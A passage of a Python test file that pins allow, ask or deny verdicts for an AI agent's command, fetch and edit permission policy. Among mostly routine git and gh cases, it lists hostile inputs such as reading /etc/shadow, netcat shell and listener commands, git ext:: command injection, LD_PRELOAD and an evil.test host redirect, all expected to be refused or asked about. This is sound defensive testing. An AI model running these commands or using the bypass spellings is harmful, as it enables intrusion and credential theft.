    DecisionCase(input="git -c color.ui=false something-new", effect="deny"),
    # The pager is not gated: it moves nothing, these subcommands already run
    # it by default, and the program it names is reachable only through `-c`
    # and `git config`, which ask.
    DecisionCase(input="git --paginate diff", effect="allow"),
    DecisionCase(input="git --no-pager log", effect="allow"),
    # A configured diff driver stays allowed on purpose, the way `--paginate`
    # does: the flag names no program, only enables one already configured,
    # and that configuration is reachable only through `-c` and `git config`.
    # git also enables textconv by default for `diff` and `log`, so refusing
    # the flag would not stop a driver that already runs on the bare form.
    DecisionCase(input="git diff --ext-diff", effect="allow"),
    DecisionCase(input="git diff --textconv HEAD", effect="allow"),
    DecisionCase(input="git cat-file --textconv HEAD:f", effect="allow"),
    # `--output` is the guard, because it names a path and lands a file there.
    # It follows forwarding rather than only the verbs that document the flag:
    # `stash list`, `stash show` and `bisect view` reach it by handing their
    # arguments to `log` or `diff`. Bare, each still reports and allows.
    DecisionCase(input="git stash show --output=/tmp/f", effect="ask"),
    DecisionCase(input="git stash list --output=/tmp/f", effect="ask"),
    DecisionCase(input="git bisect view --output=/tmp/f", effect="ask"),
    DecisionCase(input="git shortlog --output=/tmp/f HEAD", effect="ask"),
    DecisionCase(input="git stash show", effect="allow"),
    DecisionCase(input="git stash list", effect="allow"),
    DecisionCase(input="git bisect view", effect="allow"),
    DecisionCase(input="git shortlog HEAD", effect="allow"),
    DecisionCase(input="git diff-tree --output=/tmp/f", effect="ask"),
    DecisionCase(input="git diff-index --output=/tmp/f", effect="ask"),
    DecisionCase(input="git diff-pairs --output=/tmp/f", effect="ask"),
    DecisionCase(input="git range-diff --output=/tmp/f a b", effect="ask"),
    DecisionCase(input="git diff-tree HEAD", effect="allow"),
    DecisionCase(input="git diff-files", effect="allow"),
    DecisionCase(input="git diff-index HEAD", effect="allow"),
    DecisionCase(input="git range-diff a...b", effect="allow"),
    DecisionCase(input="git diff-pairs", effect="allow"),
    # Exec-bearing and file-writing flags on allowed subcommands ask.
    DecisionCase(input="git rebase --exec 'touch x' HEAD~2", effect="ask"),
    DecisionCase(input="git fetch --upload-pack=/tmp/x origin", effect="ask"),
    DecisionCase(input="git grep -Ovim pattern", effect="ask"),
    DecisionCase(input="git log --output=/tmp/f", effect="ask"),
    DecisionCase(input="git reflog", effect="allow"),
    DecisionCase(input="git reflog expire --expire=now --all", effect="ask"),
    DecisionCase(input="git pull", effect="allow"),
    DecisionCase(input="git clone https://x.test/r.git", effect="ask"),
    DecisionCase(input="git restore f", effect="ask"),
    # The ref-sourced restore twin of the checkout pathspec form allows;
    # index-sourced and opaque forms keep the row's ask.
    DecisionCase(input="git restore --source=HEAD -- docs/rules.md", effect="allow"),
    DecisionCase(input="git restore --source=HEAD docs/rules.md", effect="allow"),
    DecisionCase(input="git restore --staged --source=HEAD f", effect="allow"),
    DecisionCase(input="git restore --source=$REF f", effect="ask"),
    DecisionCase(input="git restore --source=HEAD", effect="ask"),
    DecisionCase(input="git restore -s HEAD f", effect="ask"),
    # The query family, pinned so a later narrowing reads as a failing test
    # rather than as friction nobody can source. Each of these moves no ref,
    # touches no index entry, and writes nothing into the working tree.
    DecisionCase(input="git merge-tree main dev", effect="allow"),
    DecisionCase(input="git merge-tree --write-tree main dev", effect="allow"),
    DecisionCase(input="git hash-object -w README.md", effect="allow"),
    DecisionCase(input="git commit-tree -m x HEAD^{tree}", effect="allow"),
    DecisionCase(input="git mktree", effect="allow"),
    DecisionCase(input="git mktag", effect="allow"),
    DecisionCase(input="git write-tree", effect="allow"),
    DecisionCase(input="git patch-id", effect="allow"),
    DecisionCase(input="git show-index", effect="allow"),
    DecisionCase(input="git get-tar-commit-id", effect="allow"),
    DecisionCase(input="git fsck", effect="allow"),
    DecisionCase(input="git verify-pack -v x.idx", effect="allow"),
    DecisionCase(input="git check-ref-format --branch topic", effect="allow"),
    DecisionCase(input="git stripspace", effect="allow"),
    DecisionCase(input="git column", effect="allow"),
    DecisionCase(input="git diff-pairs", effect="allow"),
    DecisionCase(input="git fmt-merge-msg", effect="allow"),
    DecisionCase(input="git request-pull main https://x.test/r HEAD", effect="allow"),
    # And the near misses the criterion excludes, each for a different one of
    # its three clauses. A sweep that admitted any of these would have been a
    # sweep of the word rather than of what the word reaches.
    DecisionCase(input="git read-tree HEAD", effect="deny"),
    DecisionCase(input="git update-index --refresh", effect="deny"),
    DecisionCase(input="git update-ref refs/heads/x HEAD", effect="deny"),
    DecisionCase(input="git pack-refs --all", effect="deny"),
    DecisionCase(input="git format-patch HEAD~1", effect="deny"),
    DecisionCase(input="git unpack-file abc123", effect="deny"),
    DecisionCase(input="git difftool -y main", effect="deny"),
    DecisionCase(input="git gc --prune=now", effect="deny"),
    # symbolic-ref spells its write as a second operand rather than as a flag,
    # so the reading form is recognized and every writing form keeps the ask.
    DecisionCase(input="git symbolic-ref HEAD", effect="allow"),
    DecisionCase(input="git symbolic-ref --short HEAD", effect="allow"),
    DecisionCase(input="git symbolic-ref HEAD refs/heads/topic", effect="ask"),
    DecisionCase(input="git symbolic-ref --delete HEAD", effect="ask"),
    DecisionCase(input="git symbolic-ref --short $REF", effect="ask"),
    # A search that runs a program is not a read, however it is spelled.
    DecisionCase(input="rg -n needle src", effect="allow"),
    DecisionCase(input="rg --pre ./decrypt needle", effect="ask"),
    DecisionCase(input="rg --pre=./decrypt needle", effect="ask"),
    DecisionCase(input="rg --hostname-bin ./who needle", effect="ask"),
    DecisionCase(input="rg -z needle archive", effect="ask"),
    DecisionCase(input="find . -name '*.py' -fprint0 out", effect="allow"),
    DecisionCase(input="find . -name '*.py' -fprint0 /etc/hosts", effect="ask"),
    # `-delete` names no path for the write row to read, and removes what it
    # matched rather than landing a file, so it keeps the verb's question.
    DecisionCase(input="find . -name '*.tmp' -delete", effect="ask"),
    # Filters that read and print, and the one flag on each that lands a file
    # — judged on where it lands, exactly as the redirection spelling is.
    DecisionCase(input="expr 1 + 2", effect="allow"),
    DecisionCase(input="numfmt --to=iec 1024", effect="allow"),
    DecisionCase(input="base64 payload.bin", effect="allow"),
    DecisionCase(input="base64 -o out.txt payload.bin", effect="allow"),
    DecisionCase(input="base64 -o .git/HEAD payload.bin", effect="ask"),
    DecisionCase(input="tree -L 2 src", effect="allow"),
    DecisionCase(input="tree -o listing.txt", effect="allow"),
    # Patch application allows in every in-repository form; only the flags that
    # write outside the working area are guarded.
    DecisionCase(input="git apply p.diff", effect="allow"),
    DecisionCase(input="git apply --cached p.diff", effect="allow"),
    DecisionCase(input="git apply --index p.diff", effect="allow"),
    DecisionCase(input="git apply --check p.diff", effect="allow"),
    DecisionCase(input="git apply -R p.diff", effect="allow"),
    DecisionCase(input="git apply --unsafe-paths p.diff", effect="ask"),
    DecisionCase(input="git apply --build-fake-ancestor=/tmp/x p.diff", effect="ask"),
    DecisionCase(input="git apply $PATCH", effect="deny"),
    DecisionCase(input="git switch main", effect="allow"),
    DecisionCase(input="git checkout main", effect="deny"),
    DecisionCase(input="git filter-branch --tree-filter x", effect="deny"),
    DecisionCase(input="sort --compress-program=/tmp/x f", effect="ask"),
    # gh: reads and compensable collaboration allow; executions,
    # attestations, publications and repository security ask.
    DecisionCase(input="gh run view 1", effect="allow"),
    DecisionCase(input="gh repo view", effect="allow"),
    DecisionCase(input="gh pr close 1", effect="allow"),
    # The deletion nested inside the allowed close survives it: no
    # reopen restores the branch.
    DecisionCase(input="gh pr close 1 --delete-branch", effect="ask"),
    DecisionCase(input="gh pr reopen 1", effect="allow"),
    DecisionCase(input="gh api -X POST /repos", effect="ask"),
    DecisionCase(input="gh issue create --title x", effect="allow"),
    DecisionCase(input="gh issue comment 3 --body hi", effect="allow"),
    DecisionCase(input="gh issue close 3", effect="allow"),
    DecisionCase(input="gh release create v1", effect="ask"),
    DecisionCase(input="gh secret set TOKEN", effect="ask"),
    DecisionCase(input="gh repo edit --visibility public", effect="ask"),
    DecisionCase(input="gh workflow run deploy.yml", effect="ask"),
    # Fetching somebody else's code into the tree asks on the trust row,
    # wherever it arrives from: a clone, a release asset, a workflow artifact
    # and a pull request head are one act with one answer. `git clone` always
    # asked, so this is the spelling that used to disagree with it.
    DecisionCase(input="gh pr checkout 123", effect="ask"),
    DecisionCase(input="gh repo clone owner/name", effect="ask"),
    DecisionCase(input="gh gist clone abc123", effect="ask"),
    DecisionCase(input="gh release download v1.0", effect="ask"),
    DecisionCase(input="gh run download 42", effect="ask"),
    # The queries beside them are untouched: what they fetch is read once and
    # lands nowhere a later build could reach it.
    DecisionCase(input="gh release list", effect="allow"),
    DecisionCase(input="gh run view 42", effect="allow"),
    # Authoring allows because the work is the author's own and the branch is
    # already pushed — both claims about this repository, and `--repo` is what
    # makes them someone else's. Reading elsewhere keeps its grant.
    DecisionCase(input="gh pr create --fill", effect="allow"),
    DecisionCase(input="gh pr create --repo other/victim --fill", effect="ask"),
    DecisionCase(input="gh pr create -R other/victim --fill", effect="ask"),
    DecisionCase(input="gh pr edit -R other/victim --title x", effect="ask"),
    DecisionCase(input="gh pr ready -R other/victim", effect="ask"),
    DecisionCase(input="gh pr list -R other/repo", effect="allow"),
    DecisionCase(input="gh pr view -R other/repo 1", effect="allow"),
    # The flag is not the only spelling of the redirect, so guarding it alone
    # would leave the same pull request one word away. `GH_` joins `GIT_` as a
    # prefix rather than a list of names, which fails closed on the next
    # variable gh learns to read.
    DecisionCase(input="GH_REPO=other/victim gh pr create --fill", effect="ask"),
    DecisionCase(input="env GH_REPO=other/victim gh pr create --fill", effect="ask"),
    DecisionCase(input="GH_HOST=evil.test gh pr create --fill", effect="ask"),
    DecisionCase(input="gh auth status", effect="allow"),
    # gh cannot print a secret's value at all, so listing is a read of
    # names and update times. Writing one is the repository's own security
    # posture and asks, which is the distinction an unclassified refusal
    # could not make: it refused the read and the write alike, for the one
    # reason true of neither.
    DecisionCase(input="gh secret list", effect="allow"),
    DecisionCase(input="gh secret set TOKEN", effect="ask"),
    # Adversarial hardening: no auto-allowed code execution or injection.
    DecisionCase(input="sudo cat /etc/shadow", effect="ask"),
    DecisionCase(input="LD_PRELOAD=./x.so ls", effect="ask"),
    DecisionCase(input="GIT_SSH_COMMAND=./x git fetch origin", effect="ask"),
    DecisionCase(input="git fetch ext::sh -c id", effect="ask"),
    DecisionCase(input="uv run --with evil pytest", effect="ask"),
    # The same flag in front of an interpreter, which is the likelier
    # spelling of the two and the one that was allowed. The gate existed and
    # sat *below* the interpreter branch, so that branch answered first:
    # `--with evil pytest` asked while `--with evil python x.py` did not, and
    # the difference was ordering rather than judgement. The bare rung stays
    # open beside it, because a named script is what the ladder points at.
    DecisionCase(input="uv run --with evil python script.py", effect="ask"),
    DecisionCase(
        input="uv run --with-requirements r.txt python script.py", effect="ask"
    ),
    DecisionCase(input="uv run --with-editable . python script.py", effect="ask"),
    DecisionCase(input="uv run --env-file .env python script.py", effect="ask"),
    DecisionCase(input="uv run python script.py", effect="allow"),
    # And the refusal still outranks the ask. Hoisting the flag check above
    # the interpreter branch softened this one from deny to ask, which is a
    # reviewability rule being answered by a supply-chain question.
    DecisionCase(input="uv run --with requests python -c 'x'", effect="deny"),
    # Unknown words behind a literal blessed uv run target only reach that
    # target's argv; at or before the target they keep the opaque gate.
    DecisionCase(
        input='uv run lup-devtools dev pr update 22 --body "$(cat tmp/x.md)"',
        effect="allow",
    ),
    DecisionCase(
        input='uv run --python "$(cat v.txt)" lup-devtools dev check', effect="deny"
    ),
    DecisionCase(input='uv run "$(cat t.txt)" dev check', effect="deny"),
    DecisionCase(input="uv run ./pytest", effect="deny"),
    DecisionCase(input="uv run /tmp/tool --help", effect="deny"),
    DecisionCase(input="printf . | xargs find . -delete", effect="ask"),
    DecisionCase(input="find . -execdir sh -c id ;", effect="deny"),
    DecisionCase(input="sort f && python -c 'x'", effect="deny"),
    # The decision lattice: a command the vocabulary lists nowhere reaches
    # whoever can answer for it, judged-risky rows ask, a command the kernel
    # could not read denies and bounces to the agent, and a leading
    # escalation marker promotes a deny to an approval question carrying the
    # agent's stated reason.
    DecisionCase(input="cargo build", effect="ask"),
    DecisionCase(input="pip install requests", effect="deny"),
    # Credential-agent family: the pure listing form is the declared
    # read-only exception; every other form is a judged deny.
    DecisionCase(input="ssh-add -l", effect="allow"),
    DecisionCase(input="ssh-add -L", effect="allow"),
    DecisionCase(input="ssh-add", effect="deny"),
    DecisionCase(input="ssh-add -D", effect="deny"),
    DecisionCase(input="ssh-add -lD", effect="deny"),
    DecisionCase(input="ssh-add -l ~/.ssh/id_ed25519", effect="deny"),
    DecisionCase(input="ssh-add $flags", effect="deny"),
    DecisionCase(input="ssh-agent", effect="deny"),
    DecisionCase(input="ssh-agent -k", effect="deny"),
    # The compound join is deny > ask > defer > allow: an unjudged segment
    # is subsumed into a judged-risky segment's approval question (the full
    # command is visible at the prompt), while a judged deny dominates it.
    DecisionCase(input="frobnicate; ssh host", effect="ask"),
    DecisionCase(input="ssh host; frobnicate", effect="ask"),
    DecisionCase(input="pip install x; ssh host", effect="deny"),
    DecisionCase(input="ssh-add -D; ssh host", effect="deny"),
    # A build root is disposable by declaration, so emptying one is one act
    # whatever it holds — the same grant `tmp/` has. A production directory
    # keeps the ask, because nothing in the command bounds what is inside it.
    DecisionCase(input="rm -rf build", effect="allow"),
    DecisionCase(input="rm -rf src", effect="ask"),
    DecisionCase(input="make test", effect="ask"),
    DecisionCase(input="wget https://x.test/f", effect="ask"),
    # Docker: the read-only query surface is judged allow; every form that
    # can mutate containers, images, or the daemon keeps the judged ask.
    DecisionCase(input="docker ps", effect="allow"),
    DecisionCase(input="docker info", effect="allow"),
    DecisionCase(input="docker inspect abc123", effect="allow"),
    DecisionCase(input="docker container ls", effect="allow"),
    DecisionCase(input="docker system df", effect="allow"),
    DecisionCase(input="docker run nginx", effect="ask"),
    DecisionCase(input="docker exec -it abc sh", effect="ask"),
    DecisionCase(input="docker system prune", effect="ask"),
    DecisionCase(input="docker compose up", effect="ask"),
    DecisionCase(input="docker rm abc123", effect="ask"),
    DecisionCase(input="docker $verb ps", effect="ask"),
    DecisionCase(input="ps aux", effect="allow"),
    DecisionCase(input="zcat f.gz", effect="allow"),
    DecisionCase(input="# lup: escalate: build the crate\ncargo build", effect="ask"),
    DecisionCase(input="# lup: escalate:\ncargo build", effect="deny"),
    DecisionCase(input="# lup: escalate: routine\ngit status", effect="allow"),
    DecisionCase(
        input="# lup: escalate: clear caches\necho x | xargs rm -rf", effect="ask"
    ),
    # Structured constructs classify their embedded commands recursively:
    # conditionals, case arms, subshells, brace groups, negation, [[ ]],
    # arithmetic expansion, and heredoc bodies.
    DecisionCase(input="if grep -q x f; then echo y; fi", effect="allow"),
    DecisionCase(input="if grep -q x f; then rm y; else echo n; fi", effect="ask"),
    DecisionCase(
        input="if [ -f x ]; then cat x; elif [ -d x ]; then ls x; fi",
        effect="allow",
    ),
    DecisionCase(input="case $m in a) echo a;; *) echo d;; esac", effect="allow"),
    DecisionCase(input="case $m in a) rm f;; esac", effect="ask"),
    DecisionCase(input="case $m in a) echo a;;", effect="deny"),
    DecisionCase(input="(cd pkg && uv run pytest)", effect="allow"),
    DecisionCase(input="if true; then (cd x && rm -rf y); fi", effect="ask"),
    DecisionCase(input="case $m in (a) echo a;; esac", effect="allow"),
    DecisionCase(input="{ git status; git log; }", effect="allow"),
    DecisionCase(input="! grep -q x f", effect="allow"),
    DecisionCase(input="[[ -f x && -n $y ]]", effect="allow"),
    DecisionCase(input="foo() { cat x; }", effect="deny"),
    DecisionCase(input="echo $((1 + 2))", effect="allow"),
    DecisionCase(input="echo $(( $(id) ))", effect="deny"),
    DecisionCase(input="cat <<'EOF'\nliteral $(x)\nEOF", effect="allow"),
    DecisionCase(input="cat <<EOF\nplain body\nEOF", effect="allow"),
    DecisionCase(input="cat <<EOF\n$(id)\nEOF", effect="deny"),
    DecisionCase(input="grep x <<< 'needle haystack'", effect="allow"),
    # A heredoc is judged by where its target is, not by its own shape and
    # not by whether something was already there. The body never decides —
    # `echo` authors the same content and always could — and what the body
    # turns out to be is read after the write, against the file.
    DecisionCase(
        input="cat > out.py <<'EOF'\nbody\nEOF", effect="allow", existing=["out.py"]
    ),
    DecisionCase(
        input="cat <<'EOF' > out.py\nbody\nEOF", effect="allow", existing=["out.py"]
    ),
    DecisionCase(
        input="cat > out.py <<'EOF'\nbody\nEOF",
        effect="allow",
        sandboxed=True,
        existing=["out.py"],
    ),
    DecisionCase(input="cat > fresh.py <<'EOF'\nbody\nEOF", effect="allow"),
    DecisionCase(input="cat > tmp/oneoff.py <<'EOF'\nbody\nEOF", effect="allow"),
    DecisionCase(input="cat > .git/HEAD <<'EOF'\nref\nEOF", effect="ask"),
    # Frozen variable bindings: assignments and read rebind for the segments
    # that follow; literal values instantiate references, opaque ones gate
    # guarded rows, and unresolved expansions deny toward explicit binding.
    DecisionCase(input="x=5", effect="allow"),
    DecisionCase(input="f=notes.txt; sort $f", effect="allow"),
    # A bound flag reaches the row exactly as the spelled one does, and is
    # answered the same way: `-o` names a path and the path decides, while
    # `--compress-program` names a program and keeps its question.
    DecisionCase(input="f=-o; sort $f x", effect="allow"),
    DecisionCase(input="f=-o; sort $f /etc/hosts", effect="ask"),
    DecisionCase(input="f=--compress-program; sort $f zstd x", effect="ask"),
    DecisionCase(input="PATH=/tmp", effect="ask"),
    DecisionCase(input='while read -r line; do echo "$line"; done < f', effect="allow"),
    DecisionCase(input='while read -r line; do sort "$line"; done', effect="deny"),
    DecisionCase(input="sort $UNBOUND f", effect="deny"),
    DecisionCase(input="sort {-o,x} f", effect="deny"),
    # Value-consuming wrappers recurse to the wrapped command; repo-relative
    # tmp/ is a writable scratch target.
    DecisionCase(input="timeout 5 uv run pytest", effect="allow"),
    DecisionCase(input="nice -n 10 uv run pytest", effect="allow"),
    DecisionCase(input="timeout 5 rm -rf x", effect="ask"),
    DecisionCase(input="env", effect="allow"),
    DecisionCase(input="uv run pytest > tmp/out.txt", effect="allow"),
    # find -exec payloads recurse; the sed scanner reads the full stdout-only
    # grammar; curl is screened to read methods against the fetch scopes.
    DecisionCase(input="find src -name '*.py' -exec grep -l TODO {} +", effect="allow"),
    DecisionCase(input="find . -exec rm {} \\;", effect="ask"),
    DecisionCase(input="find . -ok cat {} \\;", effect="deny"),
    DecisionCase(input="sed 's|/old/path|/new/path|g' f", effect="allow"),
    DecisionCase(input="sed -n '/start/,/end/p' f", effect="allow"),
    DecisionCase(input="sed '/^#/!d' f", effect="allow"),
    DecisionCase(input="sed -n '1h;2,$H;${x;p}' f", effect="allow"),
    DecisionCase(input="sed '2a inserted text' f", effect="allow"),
    DecisionCase(input="sed --sandbox 's/a/b/w out' f", effect="allow"),
    DecisionCase(input="sed 'w out' f", effect="deny"),
    DecisionCase(input="curl -s https://example.com/api", effect="ask"),
    DecisionCase(input="curl -X POST https://example.com", effect="ask"),
    DecisionCase(input="curl -o f https://example.com", effect="deny"),
    # Establishing that a service came up is a read. The socket and process
    # listings report; `nc` reports only under -z, and the flags that hand a
    # socket to a program defeat that verb wherever it sits.
    DecisionCase(input="ss -tlnp", effect="allow"),
    DecisionCase(input="ss -K dst 1.2.3.4", effect="ask"),
    DecisionCase(input="lsof -i :8000", effect="allow"),
    DecisionCase(input="pgrep -f supervisor", effect="allow"),
    DecisionCase(input="nc -z localhost 8000", effect="allow"),
    DecisionCase(input="nc localhost 8000", effect="deny"),
    DecisionCase(input="nc -l -p 4444", effect="deny"),
    DecisionCase(input="nc -z -e /bin/sh host 22", effect="deny"),
    # Contained executions: what nobody classified is settled inside rather
    # than handed to the session's own mode, judged decisions hold, and
    # escalation still promotes to a question.
    DecisionCase(input="frobnicate --weird", effect="ask"),
    DecisionCase(input="frobnicate --weird", effect="allow", sandboxed=True),
    DecisionCase(input="sed --frob 's/a/b/' f", effect="allow", sandboxed=True),
    DecisionCase(input="sort $UNBOUND f", effect="allow", sandboxed=True),
    DecisionCase(input="foo() { cat x; }", effect="allow", sandboxed=True),
    DecisionCase(input="case $m in a) echo a;;", effect="allow", sandboxed=True),
    DecisionCase(
        input="git push --delete origin feat",
        effect="ask",
        sandboxed=True,
        escapable=True,
    ),
    DecisionCase(input="sed -i 's/a/b/' f", effect="deny", sandboxed=True),
    DecisionCase(input="ssh-add -D", effect="deny", sandboxed=True),
    DecisionCase(input="frobnicate; ssh host", effect="ask", sandboxed=True),
    DecisionCase(input="python -c 'x'", effect="deny", sandboxed=True),
    # An excluded command runs with no boundary beneath it, so unjudged work
    # in it has nothing to be settled inside and returns to the lattice,
    # whose floor for a command listed nowhere is the reviewer — including
    # when it rides in beside a command the boundary would confine. A name
    # the exclusion prefix does not actually match is confined like any
    # other, which is what keeps the exclusion from widening on a substring.
    DecisionCase(input="quuxify --weird", effect="ask", sandboxed=True),
    DecisionCase(input="frobnicate; quuxify now", effect="ask", sandboxed=True),
    DecisionCase(input="quuxifyer --weird", effect="allow", sandboxed=True),
    # The toolchain needs paths the boundary grants rather than the launcher's
    # host, so it runs where the session runs under every posture. What it
    # actually requires is a boundary declaration, measured at launch, and a
    # profile that cannot meet it says so there rather than per call.
    DecisionCase(input="uv run lup-devtools dev check", effect="allow"),
    DecisionCase(
        input="uv run lup-devtools dev check",
        effect="allow",
        sandboxed=True,
        escapable=True,
    ),
    DecisionCase(input="uv run lup-devtools dev check", effect="allow", sandboxed=True),
    # A judged question is not answered by the boundary: containment is what
    # settles work nobody looked at, and somebody looked at this one.
    DecisionCase(input="git push --delete origin feat", effect="ask", sandboxed=True),
    DecisionCase(input="uv run pytest tests/unit", effect="allow", sandboxed=True),
    # A help probe only prints usage, so it reads an unclassified command
    # without judging it. Bare -h counts alone; carrying a value it is an
    # ordinary argument (mysql -h host) and classifies normally.
    DecisionCase(input="frobnicate --help", effect="allow"),
    DecisionCase(input="codex plugin marketplace --help", effect="allow"),
    DecisionCase(input="git push --help", effect="allow"),
    DecisionCase(input="frobnicate -h", effect="allow"),
    DecisionCase(input="mysql -h db.example.com", effect="ask"),
    # A session that can reach no reviewer does not run what a rule said a
    # person should see. Containment confines an operation; it does not
    # review it, so a judged question is refused under every posture —
    # reported as #86, where a remote deletion came back an unprompted allow
    # and an escalation marker granted exactly what the table refused.
    DecisionCase(
        input="git push --delete origin feat", effect="deny", interactive=False
    ),
    DecisionCase(
        input="git push --delete origin feat",
        effect="deny",
        sandboxed=True,
        escapable=True,
        interactive=False,
    ),
    DecisionCase(
        input="git push --delete origin feat",
        effect="deny",
        sandboxed=True,
        interactive=False,
    ),
    DecisionCase(input="PYTHONPATH=src uv run pytest", effect="ask"),
    DecisionCase(
        input="PYTHONPATH=src uv run pytest",
        effect="deny",
        sandboxed=True,
        interactive=False,
    ),
    DecisionCase(
        input="sed -i 's/a/b/' f", effect="deny", sandboxed=True, interactive=False
    ),
    DecisionCase(
        input="frobnicate --weird", effect="allow", sandboxed=True, interactive=False
    ),
    # The classic sourcing bypasses are declared refusals rather than gaps,
    # so they hold inside a boundary too: confining code nothing read does
    # not read it, which is the answer `python -c` already gave. An
    # unclassified segment among allows keeps the batch unclassified, which
    # contained is settled inside and uncontained reaches a reviewer.
    DecisionCase(input="eval echo x", effect="deny"),
    DecisionCase(input="source setup.sh", effect="deny"),
    DecisionCase(input=". ./env.sh", effect="deny"),
    DecisionCase(input="eval echo x", effect="deny", sandboxed=True),
    DecisionCase(input="source setup.sh", effect="deny", sandboxed=True),
    DecisionCase(input="frobnicate; ls", effect="allow", sandboxed=True),
    DecisionCase(input="echo $(whoami)", effect="allow", sandboxed=True),
    DecisionCase(input="echo $(frobnicate)", effect="ask"),
    DecisionCase(input="echo $(frobnicate)", effect="allow", sandboxed=True),
    DecisionCase(input="git log $(cat names.txt)", effect="allow", sandboxed=True),
    DecisionCase(input="echo `id`", effect="deny", sandboxed=True),
    DecisionCase(
        input="# lup: escalate: unknown tool\nfrobnicate",
        effect="ask",
        sandboxed=True,
    ),
]

FETCH_POLICY_CASES = [
    DecisionCase(input="https://docs.example.com:8443/reference/api", effect="allow"),
    DecisionCase(
        input="https://docs.example.com:8443/reference/private/key", effect="deny"
    ),
    DecisionCase(input="http://docs.example.com:8443/reference/api", effect="ask"),
    DecisionCase(input="https://docs.example.com/reference/api", effect="ask"),
    DecisionCase(input="https://docs.example.com:8443/private", effect="ask"),
    DecisionCase(input="https://api.docs.example.com:8443/reference/api", effect="ask"),
    DecisionCase(input="https://cdn.example.org/asset.js", effect="allow"),
    DecisionCase(input="https://raw.cdn.example.org/asset.js", effect="allow"),
    DecisionCase(input="https://one.two.cdn.example.org/asset.js", effect="allow"),
    DecisionCase(input="https://evilcdn.example.org/asset.js", effect="ask"),
]

EDIT_POLICY_CASES = [
    EditDecisionCase(
        path="src/module.py",
        before="value = 1",
        after="value: Any = 1",
        effect="deny",
    ),
    EditDecisionCase(
        path="src/module.py",
        before="value = 1",
        after="value = 1  # type: ignore",
        effect="deny",
    ),
    EditDecisionCase(
        path="src/module.py",
        before="value = 1",
        after="value: dict[str, object] = {}",
        effect="deny",
    ),
    # A directive is judged by what it silences: one covering the violation
    # beside it is the reasoned exception a human weighs, and one covering
    # nothing is refused before anybody is asked to weigh it.
    EditDecisionCase(
        path="src/module.py",
        before="value = 1",
        after="value = 1\nother: Any = 2  # lup: ignore[any-type]",
        effect="ask",
    ),
    EditDecisionCase(
        path="src/module.py",
        before="value = 1",
        after="value = 1\nother = 2  # lup: ignore[any-type]",
        effect="deny",
    ),
    # And a directive covering one line does not carry the line beside it.
    EditDecisionCase(
        path="src/module.py",
        before="value = 1",
        after="value = 1\nfirst: Any = 2  # lup: ignore[any-type]\nsecond: Any = 3",
        effect="deny",
    ),
    EditDecisionCase(
        path="src/module.py", before="value = 1", after="value = 2", effect="allow"
    ),
    EditDecisionCase(
        path="src/module.py",
        before="value = 1",
        after="value = compute()  # may return Any when unset",
        effect="allow",
    ),
    EditDecisionCase(
        path=".claude/settings.json", before="{}", after='{"ok": true}', effect="ask"
    ),
    EditDecisionCase(
        path="src/module.py",
        before="value = 1",
        after="value = 1  # lup: revisit",
        effect="ask",
    ),
    EditDecisionCase(
        path=".claude/settings.json",
        before="{}",
        after='{"ok": true}',
        effect="allow",
        autonomous=True,
    ),
    EditDecisionCase(
        path="src/module.py",
        before="value = 1",
        after="from typing import Any",
        effect="deny",
        autonomous=True,
    ),
    # A scratch root gates nothing: with execution closed there is no longer a
    # path from authoring a file there to running it.
    EditDecisionCase(
        path="tmp/scratch.py",
        before="value = 1",
        after="value = 2",
        effect="allow",
        autonomous=True,
    ),
    # The conventions describe how production reads, so neither a scratch nor
    # a test file is judged against them.
    EditDecisionCase(
        path="tmp/probe.py",
        before="value: str",
        after="value: Any",
        effect="allow",
    ),
    # A scratch directory is what it is wherever it sits, so a package's own
    # `tmp/` carries the same verdicts the one at the top does.
    EditDecisionCase(
        path="packages/lup/tmp/probe.py",
        before="value: str",
        after="value: Any",
        effect="allow",
    ),
    EditDecisionCase(
        path="src/lup_template/tmp/briefing.md",
        before=None,
        after="# what is left",
        effect="allow",
        path_exists=False,
    ),
    # It matches the segment and not the characters, so a sibling that merely
    # opens with the name is production and judged as production.
    EditDecisionCase(
        path="packages/lup/tmpfile.py",
        before="value: str",
        after="value: Any",
        effect="deny",
    ),
    # A package marker declares a package by existing, so creating one asks
    # nothing: the docstring is the whole content the conventions allow it.
    EditDecisionCase(
        path="src/lup_template/agent/thing/__init__.py",
        before=None,
        after='"""The thing package."""\n',
        effect="allow",
        path_exists=False,
    ),
    # The allowance is the empty content rather than the name. A package root
    # declares its public API in the same file, and that is one to read.
    EditDecisionCase(
        path="packages/lup/src/lup/thing/__init__.py",
        before=None,
        after='"""Thing."""\n\nfrom lup.thing.core import Thing\n',
        effect="ask",
        path_exists=False,
    ),
    EditDecisionCase(
        path="tests/unit/test_thing.py",
        before="value: str",
        after="value: Any",
        effect="allow",
    ),
    # The small-change gate is a reviewability convention, and it reaches
    # exactly as far as the conventions do: a fixture is written whole.
    EditDecisionCase(
        path="tests/unit/test_thing.py",
        before="value = 1",
        after="a = 1\nb = 2\nc = 3\nd = 4\ne = 5",
        effect="allow",
    ),
    # Creating a file is the same reach for the same reason. Adding lines to
    # a test freely while asking to create one is not a coherent boundary.
    EditDecisionCase(
        path="tests/unit/test_new.py",
        before=None,
        after="def test_thing() -> None:\n    assert True\n",
        effect="allow",
    ),
    EditDecisionCase(
        path="src/module.py",
        before=None,
        after="def thing() -> None:\n    pass\n",
        effect="ask",
    ),
    EditDecisionCase(
        path="src/module.py",
        before="value = 1",
        after="a = 1\nb = 2\nc = 3\nd = 4\ne = 5",
        effect="defer",
    ),
    EditDecisionCase(
        path="src/module.py",
        before="value: str",
        after="value: Any",
        effect="deny",
    ),
    EditDecisionCase(
        path="README.md",
        before="# Lup\n",
        after="# Lup\n\nAn agent-added paragraph.\n",
        effect="ask",
    ),
    EditDecisionCase(
        path="README.md",
        before="# Lup\n",
        after="# Lup, retitled\n",
        effect="ask",
        autonomous=True,
    ),
    EditDecisionCase(
        path="src/module.py",
        before="value = 1",
        after="value = 1  # lup: revisit",
        effect="ask",
        autonomous=True,
    ),
    EditDecisionCase(
        path="README.md",
        before="# Lup\n",
        after="# Lup, renamed\n",
        effect="ask",
    ),
    EditDecisionCase(
        path="sync.json",
        before='{"projects": []}',
        after='{"projects": [{"name": "fleet-app"}]}',
        effect="ask",
    ),
    EditDecisionCase(
        # The gitignored half, protected for what it can now say rather than
        # for being config: an entry there carries the `mount` deciding what
        # the next launch opens, so writing one is widening the boundary.
        path="sync.json.local",
        before='{"projects": []}',
        after='{"projects": [{"name": "fleet-app", "mount": "rw"}]}',
        effect="ask",
        path_exists=False,
    ),
    EditDecisionCase(
        path="sync.json",
        before='{"projects": []}',
        after='{"projects": [{"name": "fleet-app"}]}',
        effect="allow",
